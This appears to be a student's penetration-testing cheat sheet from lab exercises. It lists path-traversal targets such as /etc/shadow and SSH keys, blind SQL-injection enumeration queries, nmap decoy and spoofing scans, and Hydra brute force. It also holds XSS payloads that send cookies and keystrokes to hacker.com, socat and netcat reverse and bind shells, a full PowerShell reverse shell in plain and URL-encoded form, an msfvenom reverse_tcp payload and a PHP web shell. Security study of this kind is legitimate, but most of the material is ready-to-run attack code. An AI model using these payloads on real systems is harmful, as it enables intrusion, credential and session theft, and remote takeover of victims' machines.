
# VAPT Learning Notes – Table of Contents

This repository documents my hands-on learning and notes in Vulnerability Assessment and Penetration Testing (VAPT).
Detailed commands, payloads, and explanations are available in `Toolkit(VAPT).md`.

## Contents Overview

### 1. File Inclusion
- Path Traversal
- Common OS File Locations (Linux & Windows)
- Null Byte Injection (LFI)

### 2. Cross-Site Scripting (XSS)
- Basic Proof of Concept Payloads
- Session Stealing
- Keylogging
- Input Escaping Techniques
- Filter Bypass Payloads
- XSS Polyglots

### 3. SQL Injection (SQLi)
- Blind SQL Injection Concepts
- Boolean-Based Blind SQLi
  - Column Enumeration
  - Database Enumeration
  - Table Enumeration
  - Column Enumeration
  - Username & Password Enumeration
- Time-Based Blind SQLi

### 4. Burp Suite
- Proxy
- Repeater
- Intruder
- Decoder
- Comparer
- Sequencer
- Extensions Overview

### 5. Reconnaissance
- Passive Reconnaissance
- Active Reconnaissance

### 6. Nmap
- Live Host Discovery
- Port Scanning Techniques
- TCP Scan Types
- UDP Scanning
- Scan Fine-Tuning
- Spoofing and Decoys
- Fragmented Packets
- Service Detection
- OS Detection and Traceroute

### 7. Network Protocols and Services
- Telnet
- HTTP
- FTP
- SMTP
- POP3
- IMAP
- Cleartext Protocol Risks

### 8. Sniffing Attacks
- Tcpdump
- Wireshark
- Tshark
- Mitigation Using TLS

### 9. Man-in-the-Middle (MITM) Attacks
- ARP Poisoning
- Common Tools
- Cryptographic Mitigations

### 10. TLS / SSL
- OSI Layer Placement
- Protocol Upgrades (HTTPS, FTPS, etc.)
- TLS Handshake Process
- Certificate Authorities
- MITM Protection

### 11. Secure Shell (SSH)
- Secure Remote Administration
- Authentication
- Secure File Transfer (SCP)

### 12. Password Attacks
- Hydra Usage
- Defensive Measures

### 13. Socat
- Reverse Shells
- Bind Shells
- Linux Targets
- Windows Targets
- Encrypted Shells with OpenSSL

### 14. Netcat Shells
- Linux Reverse Shell
- Linux Bind Shell
- Windows Reverse Shell

### 15. MSFVenom
- Payload Structure
- Staged vs Stageless Payloads
- Multi/Handler Usage

### 16. Web Shells
- PHP Web Shells
- Remote Command Execution
- Windows PowerShell Payload Usage

---

For full technical details, payloads, and commands, refer to:
**Toolkit(VAPT).md**

#File Inclusion:
- Path Traversal:
$ http://webapp.thm/get.php?file=../../../../boot.ini 
http://webapp.thm/get.php?file=../../../../windows/win.ini

- Common OS files location:
/etc/issue
/etc/profile
/proc/version
/etc/passwd
/etc/shadow
/rott/.bash_history
/var/log/dmessage
/var/mail/root
/root/.ssh/id_rsa (has history commands for root user)
/var/log/dmessage (has global system messages)
/var/mail/root
/var/log/apache2/access.log ( has accessed requests for Apache web server)
C:\boot.ini
/root/.ssh/id_rsa (private SSH keys)

- Null Byte Usage (local file inclusion):
payload: include("languages/../../../../../etc/passwd%00").".php");

# XSS PAYLOADS:
$ <script>alert('hello');</script> (POC)
$ <script>fetch('https://hacker.com/steal?cookie=' + btoa(document.cookie));</script> (session stealing)
$ <script>document.onkeypress = function(e) { fetch('https://hacker.com/log?key=' + btoa(e.key) );}</script>
(keylogger)
$ "><script>alert('sup');</script> (escaping input tag)
$ </textarea><script>alert('yoh');</script> (escaping textarea)
$ <sscriptcript>alert('THM');</sscriptcript> (bypassing filters)
$ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('hi!')//>\x3e (XSS polyglots all in one type sh)

# SQLi Payloads:
- Blind SQLi:
$ select * from users where username='%username%' and password='%password%' LIMIT 1;
- Boolean Based Blind SQLi:
$ select * from users where username = '%username%' LIMIT 1;
$ username UNION SELECT 1;-- (saerching number of columns in the user's table)
$ username UNION SELECT 1,2,3;-- (finding the path to the actual column)
$ username UNION SELECT 1,2,3 where database() like '%';-- (enumeration of the database)
--cycle all the keys on the keyboars in the "like" operator such as 'a%' then another time 'b%' until the string     matches the first letter of the database name. After finding the first letter do it until we find the database full name.
$ username UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'something' and table_name like 'a%';--  (enumeration of table name)
-- using infromation_schema database to find the table name just like we found the databse name using "like" operator.
$ admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='something' and TABLE_NAME='something' and COLUMN_NAME like 'a%'; (enumerating column name)
$ admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='something' and TABLE_NAME='something' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id'; (preventing the discovery of the same column twice)
$ username UNION SELECT 1,2,3 from users where username like 'a% (enumeration of username)
$ username UNION SELECT 1,2,3 from users where username='something' and password like 'a% (enumerating password)

- Time Based Blind SQLi:
$ username UNION SELECT SLEEP(5);-- (if there is pause to the response, it worked otherwise it failed)
$ username UNION SELECT SLEEP(5),2;-- (adding another column until the response time is 5 seconds)

# Burp Suite:
- Proxy (enables interception and modification of requests and responses)
- Reapeater (captures, modifies and resends the captured request multiple time) -- Useful for crafting SQLi payloads.
- Intruder ( allows for spraying endpoints with requests) -- used for brute-force attacks or fuzzing endpoints.
- Decoder (data transformation) -- decode or encode payloads before sending.
- Comparer (compares two pieces of captured data at word or byte level)
- Sequencer (used when assessing randomly generated data such as session cookie values)
- Also has extensions to enhance the framework's functionality.

# Reconnaissance:
- Passive Reconnaissance: whois, nslookup, dig, shodan.io
- Active Reconnaissance: ping, traceroute, telnet, nc

# Nmap Live Host Discovery:
$ nmap -sn TARGETS
$ nmap -PR -sn TARGET/24 (ARP scan on the same subnet)
$ nmap -PE -sn MACHINE_IP/24 (ICMP echo)
$ nmap -PP -sn MACHINE_IP/24 (ICMP Timestamp)
$ nmap -PM -sn MACHINE_IP/24 (ICMP Address Mask)
$ nmap -PS -sn MACHINE_IP/24 (TCP SYNchronize)
$ sudo nmap -PA -sn MACHINE_IP/24 (TCP ACKnowledge)
$ sudo nmap -PU -sn 10.10.68.220/24 (UDP)
$ --dns-servers DNS_SERVER (Reverse-DNS Lookup)

# Nmap Port Scanning:
- TCP flags:
    -- TCP header = 24 bytes of a TCP segment
    -- First row (Source port number and Destination Port number) each allocating 16 bits (2 bytes) 
    -- Second row Sequence number and third row Acknowledgement Number
    -- Total six rows. Each row contains 32 bit (4 bytes) so total 6 rows equals to 24 bytes
    -- TCP Header Flags:
        -> URG : urgent flag first priority to be processed
        -> ACK: acknowledge the receipt of a TCP segment
        -> PSH: push flag asking TCP to pass the data to the applicatioh
        -> RST: Reset flag used to reset the connection
        -> SYN: Synchronize flag used to initiate a TCP 3-way handshake and synchronize sequence numbers
        -> FIN: Finish flag meaning the sender has no more data to send
        
- TCP Connect Scan:
$ nmap -sT MACHINE_IP

- TCP SYN Scan:
$ sudo nmap -sS MACHINE_IP (does not need to complete a TCP 3-way handshake)

- Other TCP scans:
    -- -sN (null), -sF (fin), -sX (Xmas)
        ->Similarites: if port open RST packet is received otherwise reported as open|filtered
    -- -sM (Maimon scan)
    -- -sA (ACK scan)

- UDP Scan:
$ sudo nmap -sU MACHINE_IP 

- Fine-Tuning:
    -- -p<1-50> (set ranges), -F (100 most common ports), -T<0-5> (controlling scan timing), --min-rate<number> and --max-rate<number>
    
- Spoofing and Decoys:
$ nmap -S SPOOFED_IP MACHINE_IP (spoofed ip)
$ nmap -D 10.10.0.1,10.10.0.2,RND,RND,ME MACHINE_IP (Decoy)
    -- 3rd and 4th is randomly generated while fifth is the attacker.
        -> Advantages:  make the scan look like coming from multiple IPs so the attacker's IP would be lost.

- Fragmented Packets:
$ sudo nmap -sS -p80 -f MACHINE_IP
    -> The 24 bytes of TCP header will be divided into multiple bytes of 8.
    -> So, adding another -ff will fragment the data into multiples of 16, first will get 16 bytes and thhe remaing will get the 8 bytes of the TCP header.
    
- Service Detection:
$ sudo nmap -sV MACHINE_IP (grabs service banner and bersion info)

- OS Detection and Traceroute:
$ sudo nmap -sS -O MACHINE_IP (OS details)
$ sudo nmap -sS --traceroute MACHINE_IP (finding routers between attacker and the target)

# Protocols and Servers:
- Telnet (connects to a virtual terminal of another computer) default port - 23
  
		$ telnet MACHINE_IP

 HTTP (HyperText Transfer Protocol) default port - 80, transfers web pages like HTML pages and images.
 
		$ telnet MACHINE_IP 80
		$ host:telnet
		$ GET /index.html HTTP/1.1

		- FTP (File Transfer Protocol) default port - 21
		$ ftp MACHINE_IP
		$ Name: ****
		$ Password: ****
		ftp> ls
		ftp> ascii 
		ftp> get something.txt
		ftp> exit

- SMTP (Simple Mail Transfer Protocol) default port - 25
    -- Components: Mail Submission Agent(MSA), Maile Transfer Agent(MTA), Mail Delivery Agent(MDA) and Mail User Agent (MUA)
    -- MUA -> MSA -> MTA -> MDA -> MUA
  
		$ telnet MACHINE_IP 25
		$ helo telnet
		$ mail from: <address>
		$ rctp to: <addres>
		data: something
		$ quit


		- POP3 (Post Office Protocol 3): used to download the email from MDA server. default port - 110
		$ telnet MACHINE_IP 110
		$ USER ****
		$ PASS ****
		$ STAT
		$ LIST
		$ RETR 1 (retrive the first message on the list)
		$ QUIT
-> Disadvantage: mailboxes are not synchronized like read and unread messages.

	- IMAP (Internet Message Access Protocol): keeps email synchronized across multiple devices. default port - 143
	$ telnet MACHINE_IP 143
	$ c1 LOGIN username password
	$ c2 LIST "" "*"
	$ c3 EXAMINE BOX
	$ c4 LOGOUT

** All of these protocols uses cleartext so anyone watching the network traffic would know the user's credential.

# Sniffing Attack:
- tools: Tcpdump, Wireshark, Tshark
  
		- Using tcpdump:
		$ sudo tcpdump port 110 -A (requires access to the network traffic)
    -> here POP3 packets are being captured. -A means we want it in ASCII format
- Solution: Adding an encryption layer on top of any network protocol. Particularly, Transport Layer Security (TLS).
    
# Man-in-the-middle (MITM) attack:
- tools: bettercap, ettercap -> effects cleartext protocols like FTP,SMTP and POP3.
- commonly attained by ARP poisoning on the same network subnet and capturing network traffic and all the cleartext protocols information.
- Solution: use of cryptography like Public Key Infrastructure(PKI) and trusted root certificates (which is TLS).

# Transport Layer Security (TLS)/ Secure Sockets Layer (SSL):
- Falls under the Presentation layer of the OSI model. So, data will be shown in an encrypted format (ciphertext) instead of its original form.
- Expect all servers to use TLS instead of SSL.
- After this layer the cleartext protocols and servers upgrades to HTTPS (443), FTPS (990), SMPTS (465), POP3S (995), IMAPS (993(.
- ClientHello (sends to the server) -> ServerHello, Certificate*, ServerKeyExchange*, CertificateRequest*, ServerHelloDone (server provides required paramters to be trustworhty) -> Certificate*, ClientKeyExchange, [ChangeCipherSpec], Finished (client responds with its key and other information to generate the master key then proceeds to use encryption for communication with the server -> [ChangeCipherSpec], Finished (server also switches to encryption and informs the client)
- Public Certificates used by servers are signed by certificate authorities (CA) trusted by our systems.
- MITM attack. Safe

# Secure Shell (SSL):
- Created to provide a secure way for remote system administration.
- Also uses cryptography
- SSH server (p22) and client required.
- Authenticate using username and password.
  
		$ ssh nischal@MACHINE_IP
		$ nischal@MACHINE_IP's password: helloworld
- Secure Copuy protocol can also be used to copy files from the server.
  
		$ scp document.txt nischal@MACHINE_IP:/home/nischal
		$ nischal@MACHINE_IP's password: 
		$ document.txt

# Password Attack:
- tool: Hydra (all methods related to HTTP)
  
		$ hydra -l username -P wordlist.txt MACHINE_IP service
- Solution: 
    -> make user to have a strong password
    -> account lockout after certain number of failed attempts
    -> use of CAPTCHA
    -> Two-factor Auth
    -> established knowledge about the user such as IP-based geolocation


#SOCAT COMMANDS:

	- Reverse Shell:
	$ socat TCP-L:<port> -
	- for windows to connect back:
	$ socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
	The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.
	- for linux to connect back:
	$ socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"

	- Bind Shell
	$ socat TCP-L:<PORT> EXEC:"bash -li" (Target=Linux)
	$ socat TCP-L:<PORT> EXEC:powershell.exe,pipes (Target=Windows)
	$ socat TCP:<TARGET-IP>:<TARGET-PORT> - (on the attacking machine applicable for both targets)

	- Linux Target only:
	$ socat TCP-L:<port> FILE:`tty`,raw,echo=0 (attacker)
	$ socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane (target)

# SOCAT encrypted Shells:

	$ openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt (generates a SSL certificate)

	$ cat shell.key shell.crt > shell.pem (merge the created files in .pem file)

	- Reverse Shell:
	$ socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 - (attacker)
	$ socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash (target)
	
	- Bind Shell:
	$ socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes (target)
	$ socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 - (attacker)
	
#FOR LINUX:

	- Reverse Shell:
	$ mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f (target)

	- Bind Shell:
	$ mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f (target)

#FOR WINDOWS:

		$ powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"  (target)

# MSFVENOM:

	$ msfvenom -p <PAYLOAD> <OPTIONS>
	$ msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
	        {<OS>/<arch>/<payload>}
	$ shell_reverse_tcp (stageless payload)
	$ shell/reverse_tcp (staged payload)
	$ metasploit multi/handler (used for staged payload)

#WEBSHELLS:

	$ <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?> (basic one line format) 
- RCE is normally gained in linux, but for Windows we need to copy this into the URL as the cmd argument:
  
		$ powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22






	
	

	
	
	
	
	









